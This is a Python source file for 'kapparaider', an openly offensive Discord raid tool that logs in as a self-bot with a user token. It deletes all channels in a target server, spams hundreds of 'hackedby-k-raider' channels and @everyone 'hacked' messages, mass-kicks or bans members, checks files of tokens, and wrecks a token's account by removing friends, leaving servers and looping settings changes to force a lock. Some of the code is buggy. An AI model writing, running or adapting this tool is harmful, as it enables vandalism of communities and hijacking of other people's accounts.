import requests, platform, os, sys, json, datetime, time
import discord, time, threading, random, asyncio
from discord.ext import commands
from getpass import getpass

os.environ['token'] = "none"
os.environ['choice'] = "none"
os.environ['islocked'] = "no"
os.environ['raiding'] = "no"
os.environ['spamMSG'] = "@everyone\nhttps://github.com/kl3sshydra\nhttps://t.me/iosonokappa\nthis server has been hacked!"
discordapiversion = '9'

intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)


def getGuildNAME(guildid):
    r = requests.get("https://discord.com/api/v"+discordapiversion+"/users/@me/guilds/"+guildid, headers={'Authorization':os.getenv('token')})
    return r.json['name']

def customAPIRequest(type, url, json):
    token = os.getenv('token')
    
    if type == 'get':
        r = requests.get(url, headers={'Authorization':token})
    elif type == 'post':
        r = requests.post(url, headers={'Authorization':token}, json=json)
    elif type == 'patch':
        r = requests.patch(url, headers={'Authorization':token}, json=json)
    elif type == 'delete':
        r = requests.delete(url, headers={'Authorization':token})
    
    return "{'statuscode': '"+r.status_code+"', 'content': '"+r.text+"'"
        

def _sleep(amount):
    print('Sleeping for '+amount+' seconds')
    time.sleep(amount)
    print('Done!')

def restartProgram():
    os.execl(sys.executable, sys.executable, *sys.argv)

def clearScreen():
    operatingSystem = platform.platform().lower()

    if "linux" in operatingSystem or "darwin" in operatingSystem:
        os.system("clear")
    else:
        os.system("cls")

def getMyGuilds():
    headers = {"Authorization":os.getenv('token')}
    url = "https://discord.com/api/v"+discordapiversion+"/users/@me/guilds"
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return r.text
    else:
        return "invalid token"

def getMyNameAndTag():
    headers = {"Authorization":os.getenv('token')}
    url = "https://discord.com/api/v"+discordapiversion+"/users/@me"
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        username = r.text.split("\"username\": \"")[1].split("\", \"")[0]
        discriminator = r.text.split("\"discriminator\": \"")[1].split("\", \"")[0]
        return username+"#"+discriminator
    else:
        return "invalid token"

def deletethischannelid(channelid, channelname):
    headers = {"Authorization":os.getenv('token')}
    url = "https://discord.com/api/v"+discordapiversion+"/channels/"+channelid
    r = requests.delete(url, headers=headers)

    if 'retry_after' in r.text:
        _sleep(r.json()['retry_after'])
    
    if r.status_code == 200:
        
        print(f"[-] \"{channelname}\" - {channelid}", end="\r")
    else:
        print('[WARNING]: Something went wrong.')
        print(f"Status code: {str(r.status_code)}")
        print("Response:\n"+r.text)
        exit()

def createchannelid(guild):
    headers = {"Authorization":os.getenv('token')}

    data = {
        "name", "hackedby-k-raider"
    }

    url = "https://discord.com/api/v"+discordapiversion+"/guild/"+guild+"/channels"
    r = requests.post(url, headers=headers, json=data)

    if 'retry_after' in r.text:
        _sleep(r.json()['retry_after'])
    
    if r.status_code == 200:
        
        print(f"[+] New channel created")
    else:
        print('[WARNING]: Something went wrong.')
        print(f"Status code: {str(r.status_code)}")
        print("Response:\n"+r.text)
        exit()

def debugrequest(r):
    print(f"RESPONSE CODE {r.status_code}")
    print(f"RESPONSE TEXT:\n{r.text}")

async def channelmake(guildid, x, name):
    await client.get_guild(int(guildid)).create_text_channel(name)
    print('['+name+'] Request sent, total channel requested: '+str(int(x+1)), end='\r')

#def channelmakeCallback(guildid, x, name):
#    asyncio.run(channelmake(guildid, x, name))

def allchannelsdelete(guild, token):
    r = requests.get("https://discord.com/api/v"+discordapiversion+"/guilds/"+guild+"/channels", headers={'Authorization': token})
    for x in range(len(json.loads(r.text))):
        id = json.loads(r.text)[x]['id']
        name = json.loads(r.text)[x]['name']
        threading.Thread(target=deletethischannelid, args=(id, name)).start()

async def globalsend(guild):
    for channel in guild.channels:
        try:
            await channel.send(os.getenv('spamMSG'))
            print(f"\nSent message in channel id {str(channel.id)}")
        except:
            continue

async def startRaid(token, guild, action):

    if action != "raid":    
        print("Getting members list, please wait...")
        await client.wait_until_ready()
        guildid = client.get_guild(int(guild))
        members = await guildid.chunk()
        for member in members:
            t = threading.Thread(target=executeoperations, args=(token, guild, member, action))
            t.start()     
    else:
        print('Raiding server...')
        print('Deleting channels...')
        proctime1 = time.process_time() 
        allchannelsdelete(guild,token)
        proctime2 = time.process_time() 
        print(f'Deleted all channels in {proctime2-proctime1} seconds.')

        os.environ['raiding']=='yes'
        print('Starting channel spam...')
        g = client.get_guild(int(guild))
        for x in range(500):
            await channelmake(guild, x, 'hackedby-k-raider')
            await globalsend(g)
                

        

    
def checkoperationresult(r, name):
    if r.status_code == 403:
        print("[forbidden] "+name+" - status code: "+str(r.status_code))
    else:
        print("[+] "+name+" - status code: "+str(r.status_code))

    if "verify" in r.text.lower():
        print("[ERROR]: DETECTED A TEMPORARY LOCK WITH EMAIL VERIFICATION NEEDED - OPEN DISCORD FOR FURTHER EXPLAINATIONS")
        exit()

    if r.status_code != 403 and r.status_code != 204:
        print("[WARNING] Unusual response: "+r.text)

def executeoperations(token, guild, memberOBJECT, action):
    headers = {"Authorization":token}

    id = memberOBJECT.id
    name = memberOBJECT.name    

    if action == "kick":
        url = "https://discord.com/api/v"+discordapiversion+"/guilds/"+guild
        r = requests.delete(url+"/members/"+str(id), headers=headers)
        if 'retry_after' in r.text:
            _sleep(r.json()['retry_after'])
        checkoperationresult(r, name)


    elif action == "ban":
        r = requests.put(f"https://discord.com/api/v"+discordapiversion+"/guilds/{guild}/bans/{id}", headers=headers)
        if 'retry_after' in r.text:
            _sleep(r.json()['retry_after'])
        checkoperationresult(r, name)

clearScreen()

def getTokenInInput():
    token = getpass('Insert token (you can\'t see the input): ')
    os.environ['token'] = token
    print("Starting..")


def changeSettingFunc():
    headers = {"Authorization":os.getenv('token')}
    langs = ["ko", "ja", "se", "it", "fr", "de"]
    theme = ["light", "dark"]
    randomTheme = theme[random.randint(0,len(theme)-1)]
    randomLang = langs[random.randint(0,len(langs)-1)]
    try:
        r = requests.patch(f"https://discord.com/api/v"+discordapiversion+"/users/@me/settings", headers=headers, json={'theme': str(randomTheme), 'locale': str(randomLang)})
        if r.status_code == 401:
            print("[-] Token looks invalid.")
            exit()
        elif r.status_code == 200:
            print(f"[Language: {str(randomLang)} - Theme: {str(randomTheme)}]-[Timer: {datetime.datetime.now()}]",end="\r")
        else:
            print('[WARNING]: Something went wrong.')
            print(f"Status code: {str(r.status_code)}")
            print("Response:\n"+r.text)
            exit()

    except KeyboardInterrupt:
        exit()
    
def token_templock():
    getTokenInInput()
    print(f'Starting at: {datetime.datetime.now()}')
    while os.getenv('islocked') == "no":
        t = threading.Thread(target=changeSettingFunc)
        t.start()

async def massDM(ID):
    print('Initializing dm crasher...')
    headers = {"Authorization":os.getenv('token')}
    txt = input('Insert text message -> ')
    print('Massdm started!')
    

        


def token_raid():
    getTokenInInput()

def server_raid():
    getTokenInInput()

def token_checker():
    tokenFile = input('Insert token file path: ')
    print('Reading tokens...')
    f = open(tokenFile, 'r')
    for line in f.readlines():
        os.environ['token'] = str(line).strip()
        nameAndTag = getMyNameAndTag()
        if nameAndTag != "invalid token":
            print(line+f" - ({nameAndTag})")
    exit()


def mainFunction():
    print('Welcome to kapparaider by kl3sshydra')
    os.environ['choice'] = input("""
Select an option:
  1 -> server raid
  2 -> token raid
  3 -> token checker
  4 -> account temp lock
  5 -> account dm crash

: """)
    if os.getenv('choice') == "1":
        server_raid()
    elif os.getenv('choice') == "2":
        token_raid()
    elif os.getenv('choice') == "3":
        token_checker()
    elif os.getenv('choice') == "4":
        token_templock()
    elif os.getenv('choice') == "5":
        getTokenInInput()
    else:
        print('Invalid choice.')
        time.sleep(2)
        restartProgram()

mainFunction()

def removeFriendThread(rtext, count):
    username = rtext.split("\"username\": \"")[count].split("\", \"")[0].replace("\\u", "")
    discriminator = rtext.split("\"discriminator\": \"")[count].split("\", \"")[0]
    id = rtext.split("\"id\": \"")[count].split("\", \"")[0]
    tag = username+"#"+discriminator
    headers = {"Authorization":os.getenv('token')}
    url = "https://discord.com/api/v"+discordapiversion+"/users/@me/relationships/"+id
    r = requests.delete(url, headers=headers)
    print(f"[-] {tag} - ({id})")


    

@client.event
async def on_ready():
    
    try:
        if os.getenv('choice') == "1":
            guild = input('Insert guild: ')
            action = input('Insert action (kick/ban/raid): ')
            await startRaid(os.getenv('token'), guild, action)
        elif os.getenv('choice') == "2":

            messg = input('Insert guilds name -> ')

            print("Removing all friends...")

            headers = {"Authorization":os.getenv('token')}
            url = "https://discord.com/api/v"+discordapiversion+"/users/@me/relationships"
            r = requests.get(url, headers=headers)
            if r.status_code == 200:
                count = 1
                while True:
                    try:
                        threading.Thread(target=removeFriendThread, args=(r.text, count)).start()
                        count += 1
                    except IndexError:
                        break
            else:
                print('[WARNING]: Something went wrong.')
                print(f"Status code: {str(r.status_code)}")
                print("Response:\n"+r.text)
                exit()


            print("Quitting from all guilds...")

            
            guildJSON = json.loads(getMyGuilds())

            for i in range(len(guildJSON)):
                id = guildJSON[i]['id']
                name = guildJSON[i]['name']

                headers = {"Authorization":os.getenv('token')}
                url = "https://discord.com/api/v"+discordapiversion+"/users/@me/guilds/"+id
                r = requests.delete(url, headers=headers)

                if r.status_code == 400:
                    print(f"[can't quit] \"{name}\" ({id})")
                else:
                    print(f"[-] \"{name}\" ({id})")
            

            print("Creating new guilds...")

            while True:
                data = {
                    "name" : messg,
                    "region" : "europe"
                }
                headers = {"Authorization":os.getenv('token'), "Content-Type": "application/json"}
                url = "https://discord.com/api/v"+discordapiversion+"/guilds"
                r = requests.post(url, headers=headers, json=data)
                if 'retry_after' in r.text:
                    _sleep(r.json()['retry_after'])
                
                if r.status_code == 201:
                    print(f"[+] \"{messg}\" ({json.loads(r.text)['id']})")

        elif os.getenv('choice') == "5":
            acc = input('Insert account id: ')
            await massDM(int(acc))

                
    except SystemExit:
        pass
    except Exception as e:
        print(e.with_traceback)
        time.sleep(5)
        restartProgram()


try:
    print("Logging in as '"+getMyNameAndTag()+"'")
    client.run(os.getenv('token'), bot=False)
except discord.errors.LoginFailure:
    print("[ERROR]: INVALID TOKEN - RESTARTING IN 3 SEC")
    time.sleep(3)
    restartProgram()
